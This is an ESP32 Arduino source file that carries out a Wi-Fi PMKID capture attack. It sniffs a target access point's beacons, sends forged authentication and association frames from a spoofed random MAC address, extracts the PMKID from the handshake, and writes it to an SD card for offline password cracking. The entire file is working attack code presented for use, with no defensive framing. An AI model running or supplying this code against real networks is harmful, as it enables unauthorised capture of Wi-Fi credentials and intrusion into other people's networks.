#include <Arduino.h>
#include <esp_wifi.h>
#include <esp_timer.h>
#include "SD.h"
#include "SPI.h"
#include "WiFi.h"
#include "logger.h"
#include "settings.h"
#include "PMKIDGrabber.h"

// --- Settings & Globals ---
#define CHANNEL_HOP_TIME 200
#define ATTACK_TIMEOUT   5000 

// -- Target Info --
static uint8_t targetBSSID[6];
static uint8_t targetSSID[32];
static uint8_t targetSSIDLen = 0;
static uint8_t targetChannel = 1;
static bool    targetSet = false;

// -- Captured Data (Volatile for ISR) --
volatile bool  hasNewPMKID = false;
volatile bool  hasNewEAPOL = false; // Debug flag
volatile uint8_t capturedPMKID[16];
volatile uint8_t capturedBSSID[6];

// -- Attack State --
static uint8_t clientMAC[6];
static uint8_t beaconRSN[64];
static int     beaconRSNLen = 0;
volatile int packetCounter = 0;

// -- Forward Declarations --
void IRAM_ATTR PMKID_wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type);
void savePMKID();

// ==========================================
// UTILITY FUNCTIONS
// ==========================================

static void genClientMAC() {
    for (int i = 0; i < 6; i++) clientMAC[i] = esp_random() & 0xFF;
    clientMAC[0] = (clientMAC[0] & 0xFE) | 0x02; // Locally administered
}
// ==========================================
// SNIFFER CALLBACK (ISR - NO LOGGING HERE!)
// ==========================================
void IRAM_ATTR PMKID_wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    // 1. Basic Filters
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    packetCounter++;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *pl = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    if (len < 36) return;

    uint16_t fc = pl[0] | (pl[1] << 8);
    uint8_t ftype = (fc >> 2) & 0x3;
    uint8_t fsub  = (fc >> 4) & 0xF;

    // ---------------------------------------------------------
    // A. BEACON / PROBE RESPONSE (Capture SSID & RSN)
    // ---------------------------------------------------------
    // Allow Subtype 8 (Beacon) OR Subtype 5 (Probe Response)
    if (ftype == 0 && (fsub == 8 || fsub == 5) && targetSet) {
        // BSSID Check
        if (memcmp(pl + 16, targetBSSID, 6) != 0) return;

        int pos = 36; 
        
        while (pos + 2 < len) {
            uint8_t tag = pl[pos];
            uint8_t tlen = pl[pos + 1];
            if (pos + 2 + tlen > len) break;

            // Capture SSID
            if (tag == 0 && tlen > 0 && targetSSIDLen == 0) {
                if (tlen > 32) tlen = 32;
                memcpy(targetSSID, pl + pos + 2, tlen);
                targetSSIDLen = tlen;
            }

            // Capture RSN
            if (tag == 48 && tlen < 60) {
                memcpy(beaconRSN, pl + pos, tlen + 2);
                beaconRSNLen = tlen + 2;
            }
            pos += 2 + tlen;
        }
    }
    // ---------------------------------------------------------
    // B. DATA FRAME (Capture EAPOL Message 1)
    // ---------------------------------------------------------
    if (ftype == 2 && targetSet) {
        int hdrLen = (fsub & 0x8) ? 26 : 24; // Handle QoS
        
        // Ensure it's from our Target AP (Source Address is at pl + 10)
        if (memcmp(pl + 10, targetBSSID, 6) != 0) return;

        // Check for EAPOL (802.1X Authentication)
        if (len > hdrLen + 8 && pl[hdrLen+6] == 0x88 && pl[hdrLen+7] == 0x8E) {
            hasNewEAPOL = true; 

            int eapolBody = hdrLen + 8;
            // Key Information is 2 bytes at eapolBody + 2
            // We want to ensure the "Key Type" bit is set (WPA2/3)
            if (pl[eapolBody + 1] != 3) return; 

            // The "Key Data Length" is 2 bytes at eapolBody + 97
            int keyDataLenPos = eapolBody + 97;
            if (keyDataLenPos + 2 > len) return;
            
            uint16_t keyDataLen = (pl[keyDataLenPos] << 8) | pl[keyDataLenPos+1];
            int keyDataStart = keyDataLenPos + 2;
            
            if (keyDataStart + keyDataLen > len) return;

            // DYNAMIC SEARCH: Look for RSN Tag (48) in Key Data
            int curr = keyDataStart;
            while (curr + 2 <= keyDataStart + keyDataLen) {
                uint8_t tag = pl[curr];
                uint8_t tlen = pl[curr + 1];
                
                if (tag == 48) { // Found RSN Element
                    // The PMKID is usually the last 16 bytes of the RSN element 
                    // if the RSN element is longer than 20 bytes.
                    if (tlen >= 20) { 
                        int pmkidOffset = curr + 2 + tlen - 16;
                        memcpy((void*)capturedPMKID, pl + pmkidOffset, 16);
                        memcpy((void*)capturedBSSID, targetBSSID, 6);
                        hasNewPMKID = true;
                    }
                    return;
                }
                curr += 2 + tlen; // Jump to next tag
            }
        }
    }
}

// ==========================================
// ATTACK LOGIC (RUNS IN LOOP TASK)
// ==========================================

bool runPMKIDAttack(const uint8_t *apBSSID, int channel) {
    targetSet = false;
    hasNewPMKID = false;
    hasNewEAPOL = false;
    beaconRSNLen = 0;
    targetSSIDLen = 0;
    
    memcpy(targetBSSID, apBSSID, 6);
    targetChannel = channel;
    genClientMAC();
    targetSet = true;

    logMessage("Starting Attack on Channel " + String(channel));

    // Start Sniffer
    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(&PMKID_wifi_sniffer_cb);
  esp_wifi_set_promiscuous(true);
    xSemaphoreGive(wifiMutex);

    // WAIT FOR BEACON / PROBE RESPONSE
    // Increased timeout to 5 seconds
    uint32_t start = millis();
    logMessage("Waiting for beacon... (Packets: " + String(packetCounter) + ")");
    while (millis() - start < 5000) {
        if (beaconRSNLen > 0 && targetSSIDLen > 0) break;
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

    if (beaconRSNLen == 0 || targetSSIDLen == 0) {
        logMessage("Timeout: No Beacon/ProbeResp from Target. Is channel correct?" + String(packetCounter));
        esp_wifi_set_promiscuous(false);
        return false;
    }

    logMessage("Target Acquired. Sending Frames...");

    // Send AUTH (Open System)
    uint8_t authFrame[30] = {
        0xB0, 0x00, 0x00, 0x00, 
        apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5],
        clientMAC[0], clientMAC[1], clientMAC[2], clientMAC[3], clientMAC[4], clientMAC[5],
        apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5],
        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00
    };
    logMessage("Target Acquired. Sending Frames...");

    // Send AUTH (Open System) - Send twice to be sure
    for(int i=0; i<2; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, authFrame, sizeof(authFrame), false);
        vTaskDelay(20 / portTICK_PERIOD_MS);
    }

    vTaskDelay(50 / portTICK_PERIOD_MS);

    // Build ASSOC REQ
    uint8_t assocFrame[256];
    int p = 0;

    assocFrame[p++] = 0x00; assocFrame[p++] = 0x00; 
    assocFrame[p++] = 0x00; assocFrame[p++] = 0x00; 
    memcpy(assocFrame + p, apBSSID, 6); p += 6;    
    memcpy(assocFrame + p, clientMAC, 6); p += 6;   
    memcpy(assocFrame + p, apBSSID, 6); p += 6;     
    assocFrame[p++] = 0x00; assocFrame[p++] = 0x00; 

    assocFrame[p++] = 0x11; assocFrame[p++] = 0x00; 
    assocFrame[p++] = 0x0A; assocFrame[p++] = 0x00; 

    // SSID
    assocFrame[p++] = 0x00;
    assocFrame[p++] = targetSSIDLen;
    memcpy(assocFrame + p, targetSSID, targetSSIDLen);
    p += targetSSIDLen;

    // Rates
    uint8_t rates[] = {0x01, 0x04, 0x02, 0x04, 0x0B, 0x16};
    memcpy(assocFrame + p, rates, sizeof(rates));
    p += sizeof(rates);

    // RSN
    memcpy(assocFrame + p, beaconRSN, beaconRSNLen);
    p += beaconRSNLen;
    for (int i = 0; i < 5; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, assocFrame, p, false);
        vTaskDelay(20 / portTICK_PERIOD_MS);
    }
    // esp_wifi_80211_tx(WIFI_IF_STA, assocFrame, p, false);
    logMessage("Assoc Req Sent. Listening for EAPOL...");
    // WAIT FOR PMKID with RE-TRANSMIT
    start = millis();
    uint32_t lastAssoc = 0;

    while (millis() - start < ATTACK_TIMEOUT) {
        if (hasNewPMKID) break;

        // Re-send Association Request every 500ms if we haven't seen EAPOL yet
        if (millis() - lastAssoc > 500) {
            esp_wifi_80211_tx(WIFI_IF_STA, authFrame, sizeof(authFrame), false);
            lastAssoc = millis();
        }

        if (hasNewEAPOL) {
            // We saw EAPOL, but didn't find PMKID in it yet. 
            // This is good! It means the AP is talking to us.
            hasNewEAPOL = false; 
        }
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }
    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    esp_wifi_set_promiscuous(false);
    xSemaphoreGive(wifiMutex);

    return hasNewPMKID;
}

// ==========================================
// SETUP & LOOP
// ==========================================

void attackSetup() {
}

void attackLoop() {
    // Check if we captured a PMKID (Saved by ISR into volatile globals)
    if (hasNewPMKID) {
        // Safe to use Serial and SD here
        Serial.println("!!! SUCCESS: PMKID CAPTURED !!!");
        
        char hexPMKID[33];
        for(int i=0; i<16; i++) sprintf(hexPMKID+i*2, "%02X", capturedPMKID[i]);
        hexPMKID[32] = 0;
        
        char filename[64];
        snprintf(filename, sizeof(filename), "/pmkid/%02X%02X%02X%02X%02X%02X.txt", 
            capturedBSSID[0], capturedBSSID[1], capturedBSSID[2], 
            capturedBSSID[3], capturedBSSID[4], capturedBSSID[5]);

        File f = SD.open(filename, FILE_APPEND);
        if(f) {
            f.println(hexPMKID);
            f.close();
            Serial.println("Saved to SD: " + String(hexPMKID));
        }
        
        // Reset flag
        hasNewPMKID = false;
    }
    
    // Add scanning/trigger logic here
}